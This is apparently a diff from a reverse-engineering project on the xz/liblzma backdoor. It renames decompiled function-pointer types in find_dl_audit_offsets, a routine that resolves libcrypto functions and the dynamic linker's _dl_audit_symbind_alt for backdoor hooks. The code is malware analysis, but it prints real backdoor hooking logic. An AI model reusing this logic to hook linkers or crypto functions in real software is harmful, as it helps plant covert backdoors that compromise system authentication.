@@ -29,15 +29,15 @@ BOOL find_dl_audit_offsets
   BOOL BVar8;
   lzma_allocator *allocator;
   Elf64_Sym *pEVar9;
-  _func_45 *p_Var10;
-  _func_37 *p_Var11;
-  _func_50 *p_Var12;
+  pfn_EVP_PKEY_free_t ppVar10;
+  pfn_EC_KEY_get0_group_t ppVar11;
+  pfn_EVP_CIPHER_CTX_free_t ppVar12;
   long lVar13;
   uchar *vaddr;
   backdoor_hooks_data_t *pbVar14;
   byte bVar15;
   backdoor_hooks_data_t *hooks_ctx;
-  _func_64 *audit_stub;
+  dl_audit_symbind_alt_fn audit_stub;
   lzma_allocator *libcrypto_allocator;
   
   bVar15 = 0;
@@ -52,17 +52,17 @@ BOOL find_dl_audit_offsets
         EVar3 = pEVar9->st_value;
         pEVar4 = data->elf_handles->libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-        imported_funcs->EC_POINT_point2oct = (_func_35 *)(pEVar4->e_ident + EVar3);
+        imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(pEVar4->e_ident + EVar3);
       }
-      p_Var10 = (_func_45 *)lzma_alloc(0x6f8,allocator);
-      imported_funcs->EVP_PKEY_free = p_Var10;
-      if (p_Var10 != (_func_45 *)0x0) {
+      ppVar10 = (pfn_EVP_PKEY_free_t)lzma_alloc(0x6f8,allocator);
+      imported_funcs->EVP_PKEY_free = ppVar10;
+      if (ppVar10 != (pfn_EVP_PKEY_free_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
       pEVar9 = elf_symbol_get(data->elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
-      p_Var11 = (_func_37 *)lzma_alloc(0x7e8,allocator);
-      imported_funcs->EC_KEY_get0_group = p_Var11;
-      if (p_Var11 != (_func_37 *)0x0) {
+      ppVar11 = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,allocator);
+      imported_funcs->EC_KEY_get0_group = ppVar11;
+      if (ppVar11 != (pfn_EC_KEY_get0_group_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
       peVar5 = data->elf_handles;
@@ -70,7 +70,8 @@ BOOL find_dl_audit_offsets
         EVar3 = pEVar9->st_value;
         pEVar4 = peVar5->libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
-        imported_funcs->EC_KEY_get0_public_key = (_func_36 *)(pEVar4->e_ident + EVar3);
+        imported_funcs->EC_KEY_get0_public_key =
+             (pfn_EC_KEY_get0_public_key_t)(pEVar4->e_ident + EVar3);
       }
       pEVar9 = elf_symbol_get(peVar5->dynamic_linker,STR_dl_audit_symbind_alt,0);
       if (pEVar9 != (Elf64_Sym *)0x0) {
@@ -78,14 +79,14 @@ BOOL find_dl_audit_offsets
         size = pEVar9->st_size;
         vaddr = peVar2->elfbase->e_ident + pEVar9->st_value;
         (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
-        (hooks->ldso_ctx)._dl_audit_symbind_alt = (_func_64 *)vaddr;
+        (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)vaddr;
         BVar8 = elf_contains_vaddr(peVar2,vaddr,size,4);
         if ((BVar8 != FALSE) &&
            (BVar8 = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), BVar8 != FALSE))
         {
-          p_Var12 = (_func_50 *)lzma_alloc(0xb28,allocator);
-          imported_funcs->EVP_CIPHER_CTX_free = p_Var12;
-          if (p_Var12 != (_func_50 *)0x0) {
+          ppVar12 = (pfn_EVP_CIPHER_CTX_free_t)lzma_alloc(0xb28,allocator);
+          imported_funcs->EVP_CIPHER_CTX_free = ppVar12;
+          if (ppVar12 != (pfn_EVP_CIPHER_CTX_free_t)0x0) {
             imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
           }
           BVar8 = find_dl_naudit(data->elf_handles->dynamic_linker,data->elf_handles->libcrypto,
